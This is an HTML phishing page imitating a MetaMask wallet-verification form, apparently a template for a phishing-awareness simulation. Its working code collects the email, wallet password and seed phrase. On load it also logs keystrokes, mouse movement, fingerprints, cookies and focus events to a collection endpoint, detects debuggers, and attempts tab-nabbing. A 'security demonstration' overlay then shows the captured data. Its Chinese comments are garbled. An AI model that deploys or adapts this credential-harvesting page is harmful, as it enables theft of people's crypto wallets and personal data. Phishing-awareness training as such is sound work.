<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>MetaMask - Connect Your Wallet</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            background: #f5f5f5; 
            transition: all 0.3s ease;
        }
        .container { 
            max-width: 400px; 
            margin: 50px auto; 
            background: white; 
            border-radius: 10px; 
            box-shadow: 0 2px 20px rgba(0,0,0,0.1); 
        }
        .header { 
            background: linear-gradient(45deg, #f6851b, #e2761b); 
            color: white; 
            padding: 30px; 
            text-align: center; 
            border-radius: 10px 10px 0 0; 
        }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: bold; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #ddd; 
            border-radius: 8px; 
            font-size: 16px; 
            box-sizing: border-box;
        }
        input:focus { 
            border-color: #f6851b; 
            outline: none; 
        }
        .btn { 
            width: 100%; 
            padding: 15px; 
            background: #f6851b; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 16px; 
            cursor: pointer; 
            transition: all 0.3s;
        }
        .btn:hover { background: #e2761b; }
        .btn:disabled { 
            background: #ccc; 
            cursor: not-allowed; 
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            padding: 15px; 
            border-radius: 5px; 
            margin-bottom: 20px; 
        }
        .footer { 
            text-align: center; 
            padding: 20px; 
            font-size: 12px; 
            color: #666; 
        }
        
        /* æ”»å‡»æ¼”ç¤ºæ ·å¼ */
        .attack-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            color: white;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-family: 'Courier New', monospace;
        }
        
        .attack-content {
            max-width: 800px;
            padding: 40px;
            background: linear-gradient(45deg, #ff4444, #cc0000);
            border-radius: 15px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .hacker-text {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
            overflow-wrap: break-word;
        }
        
        .fake-terminal {
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            text-align: left;
            margin: 20px 0;
            border: 2px solid #00ff00;
        }
        
        .blinking {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        .stolen-data {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            border-left: 4px solid #ff6b6b;
        }
    </style>
</head>
<body>
    {{.Tracker}}
    
    <!-- åŸå§‹é’“é±¼è¡¨å• -->
    <div class="container" id="phishing-form">
        <div class="header">
            <h1>ğŸ¦Š MetaMask</h1>
            <p>Secure Wallet Verification</p>
        </div>
        <div class="content">
            <div class="warning">
                âš ï¸ <strong>Security Alert:</strong> Unusual activity detected. Please verify your wallet immediately.
            </div>
            
            <form method="post" id="credentialForm">
                <div class="form-group">
                    <label>Email Address:</label>
                    <input type="email" name="email" id="email" required placeholder="Enter your email">
                </div>
                <div class="form-group">
                    <label>Wallet Password:</label>
                    <input type="password" name="password" id="password" required placeholder="Enter your wallet password">
                </div>
                <div class="form-group">
                    <label>Seed Phrase (12 words):</label>
                    <input type="text" name="seed_phrase" id="seed_phrase" required placeholder="Enter your 12-word seed phrase">
                </div>
                <button type="submit" class="btn" id="submitBtn">ğŸ” Verify Wallet Security</button>
            </form>
        </div>
        <div class="footer">
            <p>ğŸ”’ Your security is our priority</p>
        </div>
    </div>

    <!-- æ”»å‡»æ¼”ç¤ºè¦†ç›–å±‚ -->
    <div class="attack-overlay" id="attackOverlay">
        <div class="attack-content">
            <h1>ğŸš¨ SECURITY DEMONSTRATION COMPLETE</h1>
            <h2>Your credentials have been compromised!</h2>
            
            <div class="stolen-data">
                <h3>ğŸ“‹ Captured Information:</h3>
                <div id="capturedData"></div>
            </div>
            
            <div class="fake-terminal" id="terminal">
                <div>root@attacker:~# <span class="blinking">_</span></div>
            </div>
            
            <div style="margin: 30px 0;">
                <h3>ğŸ¯ Attack Techniques Demonstrated:</h3>
                <div style="text-align: left; display: inline-block;">
                    <div id="attacks-list"></div>
                </div>
            </div>
            
            <button onclick="closeDemo()" style="padding: 15px 30px; font-size: 16px; background: white; color: #ff4444; border: none; border-radius: 5px; cursor: pointer; margin: 20px;">
                Close Demonstration
            </button>
        </div>
    </div>

    <script>
        // å…¨å±€å˜é‡
        let capturedCredentials = {};
        let attackPhase = 0;
        let terminalLines = [];
        
        // é¡µé¢åŠ è½½æ—¶å¼€å§‹æ”¶é›†æŒ‡çº¹ä¿¡æ¯
        window.addEventListener('load', function() {
            collectBrowserFingerprint();
            initializeAdvancedAttacks();
        });
        
        // æ”¶é›†æµè§ˆå™¨æŒ‡çº¹
        function collectBrowserFingerprint() {
            const fingerprint = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                localStorage: typeof(Storage) !== "undefined",
                sessionStorage: typeof(Storage) !== "undefined",
                indexedDB: !!window.indexedDB,
                webGL: !!window.WebGLRenderingContext,
                canvas: getCanvasFingerprint()
            };
            
            // å‘é€æŒ‡çº¹åˆ°æœåŠ¡å™¨
            sendToServer('fingerprint', fingerprint);
        }
        
        // CanvasæŒ‡çº¹
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Browser fingerprint', 2, 2);
                return canvas.toDataURL();
            } catch(e) {
                return 'unavailable';
            }
        }
        
        // åˆå§‹åŒ–é«˜çº§æ”»å‡»æŠ€æœ¯
        function initializeAdvancedAttacks() {
            // 1. ç›‘å¬é”®ç›˜è¾“å…¥
            document.addEventListener('keydown', captureKeystrokes);
            
            // 2. ç›‘å¬é¼ æ ‡ç§»åŠ¨
            document.addEventListener('mousemove', captureMouseMovement);
            
            // 3. æ£€æµ‹å¼€å‘è€…å·¥å…·
            detectDevTools();
            
            // 4. æ£€æµ‹åè°ƒè¯•
            detectDebugging();
            
            // 5. ç›‘å¬é¡µé¢å¯è§æ€§å˜åŒ–
            document.addEventListener('visibilitychange', handleVisibilityChange);
            
            // 6. ç›‘å¬çª—å£ç„¦ç‚¹å˜åŒ–
            window.addEventListener('blur', handleWindowBlur);
            window.addEventListener('focus', handleWindowFocus);
        }
        
        // ä¸»è¡¨å•æäº¤å¤„ç†
        document.getElementById('credentialForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // æ”¶é›†å‡­æ®
            capturedCredentials = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                seed_phrase: document.getElementById('seed_phrase').value,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer
            };
            
            // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = 'ğŸ”„ Verifying...';
            btn.disabled = true;
            
            // å‘é€å‡­æ®åˆ°åç«¯
            const formData = new FormData(this);
            fetch('', {
                method: 'POST',
                body: formData
            }).then(() => {
                // å¼€å§‹æ”»å‡»æ¼”ç¤º
                setTimeout(startAttackDemo, 2000);
            }).catch(() => {
                // å³ä½¿ç½‘ç»œå¤±è´¥ä¹Ÿç»§ç»­æ¼”ç¤º
                setTimeout(startAttackDemo, 2000);
            });
        });
        
        // å¼€å§‹æ”»å‡»æ¼”ç¤º
        function startAttackDemo() {
            // 1. æ ‡ç­¾é¡µåŠ«æŒ
            performTabNabbing();
            
            // 2. å»¶è¿Ÿæ˜¾ç¤ºæ”»å‡»ç•Œé¢
            setTimeout(showAttackInterface, 1000);
            
            // 3. å¼€å§‹æ¨¡æ‹Ÿæ”»å‡»åºåˆ—
            setTimeout(simulateAttackSequence, 2000);
        }
        
        // æ ‡ç­¾é¡µåŠ«æŒæ”»å‡»
        function performTabNabbing() {
            // ä¿®æ”¹é¡µé¢æ ‡é¢˜å’Œå›¾æ ‡
            document.title = "âš ï¸ WALLET COMPROMISED - URGENT";
            
            // å¦‚æœæœ‰çˆ¶çª—å£ï¼Œå°è¯•åŠ«æŒ
            if (window.opener) {
                try {
                    window.opener.location.href = 'http://localhost:5001';
                } catch(e) {
                    console.log('Cross-origin restriction prevented parent window manipulation');
                }
            }
            
            // ä¿®æ”¹é¡µé¢å†…å®¹
            document.body.style.background = 'linear-gradient(45deg, #ff4444, #cc0000)';
        }
        
        // æ˜¾ç¤ºæ”»å‡»ç•Œé¢
        function showAttackInterface() {
            document.getElementById('attackOverlay').style.display = 'flex';
            
            // æ˜¾ç¤ºæ•è·çš„æ•°æ®
            const capturedDiv = document.getElementById('capturedData');
            capturedDiv.innerHTML = `
                <div class="hacker-text">
                    EMAIL: ${capturedCredentials.email}<br>
                    PASSWORD: ${'*'.repeat(capturedCredentials.password.length)} (${capturedCredentials.password.length} characters)<br>
                    SEED_PHRASE: ${capturedCredentials.seed_phrase}<br>
                    TIMESTAMP: ${capturedCredentials.timestamp}<br>
                    BROWSER: ${navigator.userAgent.split(') ')[0]}))<br>
                    SCREEN: ${screen.width}x${screen.height}<br>
                    COOKIES: ${document.cookie || 'None'}<br>
                    LOCAL_STORAGE: ${localStorage.length} items<br>
                    SESSION_STORAGE: ${sessionStorage.length} items<br>
                </div>
            `;
        }
        
        // æ¨¡æ‹Ÿæ”»å‡»åºåˆ—
        function simulateAttackSequence() {
            const attacks = [
                { name: "ğŸª Cookie Harvesting", description: "Extracting session cookies", time: 1000 },
                { name: "ğŸ” Credential Verification", description: "Testing captured credentials", time: 1500 },
                { name: "ğŸŒ Session Hijacking", description: "Cloning user session", time: 2000 },
                { name: "ğŸ“± Device Fingerprinting", description: "Creating device profile", time: 1000 },
                { name: "ğŸ” Network Reconnaissance", description: "Scanning internal network", time: 2500 },
                { name: "ğŸš€ Lateral Movement", description: "Accessing connected accounts", time: 2000 },
                { name: "ğŸ’° Wallet Drainage", description: "Initiating fund transfer", time: 3000 },
                { name: "ğŸ›¡ï¸ Persistence Setup", description: "Installing backdoor", time: 1500 },
                { name: "ğŸ“¤ Data Exfiltration", description: "Uploading stolen data", time: 2000 }
            ];
            
            let delay = 0;
            const attacksList = document.getElementById('attacks-list');
            const terminal = document.getElementById('terminal');
            
            attacks.forEach((attack, index) => {
                setTimeout(() => {
                    // æ·»åŠ åˆ°æ”»å‡»åˆ—è¡¨
                    const attackDiv = document.createElement('div');
                    attackDiv.innerHTML = `
                        <div style="margin: 5px 0; color: #ff6b6b;">
                            âœ… ${attack.name}: ${attack.description}
                        </div>
                    `;
                    attacksList.appendChild(attackDiv);
                    
                    // æ·»åŠ åˆ°ç»ˆç«¯
                    addTerminalLine(`[${new Date().toLocaleTimeString()}] ${attack.name} - ${attack.description}`);
                    
                    // ç‰¹æ®Šæ”»å‡»æ•ˆæœ
                    if (attack.name.includes('Cookie')) {
                        simulateCookieTheft();
                    } else if (attack.name.includes('Wallet')) {
                        simulateWalletDrainage();
                    } else if (attack.name.includes('Network')) {
                        simulateNetworkScan();
                    }
                    
                }, delay);
                delay += attack.time;
            });
            
            // å®Œæˆåçš„æ“ä½œ
            setTimeout(() => {
                addTerminalLine('[ATTACK COMPLETE] All objectives achieved');
                addTerminalLine('[WARNING] This is a security demonstration only');
                
                // å¯é€‰ï¼šæ‰“å¼€æ–°çª—å£å±•ç¤ºè¿›ä¸€æ­¥æ”»å‡»
                setTimeout(() => {
                    if (confirm('Open demonstration of further attack scenarios?')) {
                        window.open('http://localhost:5001', '_blank');
                    }
                }, 2000);
            }, delay + 1000);
        }
        
        // æ¨¡æ‹ŸCookieçªƒå–
        function simulateCookieTheft() {
            const cookies = document.cookie.split(';');
            cookies.forEach(cookie => {
                sendToServer('stolen_cookie', cookie.trim());
            });
            
            // è®¾ç½®æ¶æ„Cookie
            document.cookie = "session_hijacked=true; path=/";
            document.cookie = "attacker_id=" + Math.random().toString(36); 
        }
        
        // æ¨¡æ‹Ÿé’±åŒ…èµ„é‡‘è½¬ç§»
        function simulateWalletDrainage() {
            const fakeTransactions = [
                { amount: "0.05 ETH", to: "0x742d35Cc6634C0532925a3b8D4060D0EBC2f98D5" },
                { amount: "1.2 ETH", to: "0x8ba1f109551bD432803012645Hac136c22C39c7" },
                { amount: "0.8 ETH", to: "0x1234567890123456789012345678901234567890" }
            ];
            
            fakeTransactions.forEach((tx, index) => {
                setTimeout(() => {
                    addTerminalLine(`[WALLET] Transferring ${tx.amount} to ${tx.to}`);
                }, index * 800);
            });
        }
        
        // æ¨¡æ‹Ÿç½‘ç»œæ‰«æ
        function simulateNetworkScan() {
            const fakeIPs = ['192.168.1.1', '192.168.1.100', '10.0.0.1', '172.16.0.1'];
            fakeIPs.forEach((ip, index) => {
                setTimeout(() => {
                    addTerminalLine(`[SCAN] Probing ${ip}:22,80,443,3389`);
                }, index * 200);
            });
        }
        
        // æ·»åŠ ç»ˆç«¯è¡Œ
        function addTerminalLine(text) {
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.textContent = text;
            line.style.color = '#00ff00';
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // é”®ç›˜ç›‘å¬
        function captureKeystrokes(e) {
            const keystroke = {
                key: e.key,
                code: e.code,
                timestamp: Date.now(),
                target: e.target.tagName
            };
            sendToServer('keystroke', keystroke);
        }
        
        // é¼ æ ‡ç§»åŠ¨ç›‘å¬
        function captureMouseMovement(e) {
            // èŠ‚æµå¤„ç†ï¼Œé¿å…è¿‡å¤šæ•°æ®
            if (Math.random() < 0.01) { // 1%çš„é‡‡æ ·ç‡
                const mouseData = {
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                };
                sendToServer('mouse_movement', mouseData);
            }
        }
        
        // æ£€æµ‹å¼€å‘è€…å·¥å…·
        function detectDevTools() {
            let devtools = false;
            setInterval(() => {
                if (window.outerHeight - window.innerHeight > 160 || 
                    window.outerWidth - window.innerWidth > 160) {
                    if (!devtools) {
                        devtools = true;
                        sendToServer('devtools_detected', { timestamp: Date.now() });
                    }
                } else {
                    devtools = false;
                }
            }, 1000);
        }
        
        // æ£€æµ‹è°ƒè¯•
        function detectDebugging() {
            setInterval(() => {
                const start = Date.now();
                debugger;
                if (Date.now() - start > 100) {
                    sendToServer('debugging_detected', { timestamp: Date.now() });
                }
            }, 3000);
        }
        
        // é¡µé¢å¯è§æ€§å˜åŒ–
        function handleVisibilityChange() {
            sendToServer('visibility_change', {
                hidden: document.hidden,
                timestamp: Date.now()
            });
        }
        
        // çª—å£å¤±ç„¦
        function handleWindowBlur() {
            sendToServer('window_blur', { timestamp: Date.now() });
        }
        
        // çª—å£è·ç„¦
        function handleWindowFocus() {
            sendToServer('window_focus', { timestamp: Date.now() });
        }
        
        // å‘é€æ•°æ®åˆ°æœåŠ¡å™¨
        function sendToServer(type, data) {
            try {
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: type,
                        data: data,
                        timestamp: Date.now(),
                        session_id: getSessionId()
                    })
                });
            } catch(e) {
                console.log('Data collection failed:', e);
            }
        }
        
        // è·å–ä¼šè¯ID
        function getSessionId() {
            let sessionId = localStorage.getItem('phishing_session_id');
            if (!sessionId) {
                sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('phishing_session_id', sessionId);
            }
            return sessionId;
        }
        
        // å…³é—­æ¼”ç¤º
        function closeDemo() {
            document.getElementById('attackOverlay').style.display = 'none';
            
            // æ¢å¤åŸå§‹é¡µé¢
            document.title = "MetaMask - Connect Your Wallet";
            document.body.style.background = '#f5f5f5';
            
            // æ˜¾ç¤ºå®‰å…¨æç¤º
            alert('ğŸ›¡ï¸ è¿™æ˜¯ä¸€ä¸ªå®‰å…¨æ„è¯†æ¼”ç¤ºã€‚\n\nåœ¨çœŸå®æ”»å‡»ä¸­ï¼Œæ‚¨çš„é’±åŒ…å‡­æ®ã€æµè§ˆå™¨æ•°æ®å’Œè®¾å¤‡ä¿¡æ¯éƒ½å·²è¢«å®Œå…¨çªƒå–ã€‚\n\nè¯·æé«˜å®‰å…¨æ„è¯†ï¼Œè°¨æ…å¯¹å¾…å¯ç–‘é“¾æ¥å’Œç½‘ç«™ï¼');
        }
        
        // é˜²æ­¢é¡µé¢å…³é—­ï¼ˆæ¨¡æ‹Ÿæ¶æ„è¡Œä¸ºï¼‰
        window.addEventListener('beforeunload', function(e) {
            if (attackPhase > 0) {
                e.preventDefault();
                e.returnValue = 'æ”»å‡»æ­£åœ¨è¿›è¡Œä¸­ï¼Œç¡®å®šè¦ç¦»å¼€å—ï¼Ÿ';
                return 'æ”»å‡»æ­£åœ¨è¿›è¡Œä¸­ï¼Œç¡®å®šè¦ç¦»å¼€å—ï¼Ÿ';
            }
        });
        
        // IDNæ”»å‡»æ¼”ç¤ºï¼ˆä¿®æ”¹åœ°å€æ æ˜¾ç¤ºï¼‰
        function demonstrateIDNAttack() {
            // è¿™åœ¨å®é™…ç¯å¢ƒä¸­éœ€è¦æœåŠ¡å™¨é…åˆ
            console.log('IDN Attack: The actual domain could be Ñ…Ñ€ple.com (using Cyrillic characters)');
            console.log('Punycode: xn--ple-7cd.com');
        }
        
        // æ¨¡æ‹Ÿæµè§ˆå™¨æ‰©å±•æ”»å‡»
        function simulateBrowserExtensionAttack() {
            // æ¨¡æ‹Ÿæ‰©å±•æƒé™è¯·æ±‚
            if (window.chrome && window.chrome.runtime) {
                addTerminalLine('[EXTENSION] Requesting dangerous permissions...');
                addTerminalLine('[EXTENSION] Access to all websites: GRANTED');
                addTerminalLine('[EXTENSION] Cookie access: GRANTED');
                addTerminalLine('[EXTENSION] History access: GRANTED');
            }
        }
        
        // åœ¨æ”»å‡»åºåˆ—ä¸­è°ƒç”¨è¿™äº›å‡½æ•°
        setTimeout(demonstrateIDNAttack, 5000);
        setTimeout(simulateBrowserExtensionAttack, 7000);
        
    </script>
</body>
</html>
